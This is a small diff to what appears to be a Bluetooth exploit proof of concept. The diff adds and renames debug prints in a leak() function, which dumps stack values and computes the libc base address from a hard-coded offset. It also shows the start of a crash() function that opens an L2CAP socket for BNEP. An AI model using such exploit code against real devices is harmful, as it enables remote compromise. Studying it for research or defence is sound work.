@@ -29,6 +29,7 @@ def leak(dst):
     i = 0
     j = 0
 
+    print ("[*] Stack dump...")
     for x in result:
         for y in x:
             print("%d:%d: 0x%x" % (i,j,y))
@@ -38,7 +39,7 @@ def leak(dst):
 
     LIBC_OFFSET = 0x557f3
     LIBC_BASE = result[5][0] - LIBC_OFFSET
-    print("[*] LIBC: 0x%0x" % LIBC_BASE)
+    print("[*] LIBC_BASE: 0x%0x" % LIBC_BASE)
 
 def crash(dst):
     bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
